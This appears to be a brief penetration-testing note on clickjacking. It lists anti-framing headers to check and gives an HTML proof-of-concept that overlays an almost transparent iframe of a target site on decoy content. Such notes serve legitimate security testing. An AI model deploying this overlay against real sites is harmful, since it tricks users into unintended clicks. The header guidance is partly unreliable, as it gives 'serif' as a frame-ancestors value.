# Clickjacking

Tags: Technique

first of all you need to check security headers for this vulnerability

`X-Frame-Options`: DENY or SAMEORIGIN

`Content-Security-Policy`: frame-ancestors ‘none’ or ‘serif’; or *.example.com;

`SameSite=Strict`

if this headers isn't set you may can perform clickjacking or in pentest progress you must report it.

the clickjacking code sample:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```